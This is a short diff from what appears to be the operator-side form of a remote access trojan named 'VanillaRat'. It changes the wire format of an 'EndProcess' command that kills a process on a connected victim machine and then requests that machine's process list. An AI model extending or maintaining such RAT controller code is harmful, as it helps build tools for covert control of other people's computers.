@@ -35,7 +35,7 @@ namespace VanillaRat.Forms
             }
 
             ListViewItem Item = lbRunningProcesses.SelectedItems[0];
-            Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("EndProcess(" + Item.SubItems[1].Text + ")"));
+            Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("EndProcess<{" + Item.SubItems[1].Text + "}>"));
             Item.Remove();
             Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("GetProcesses"));
         }
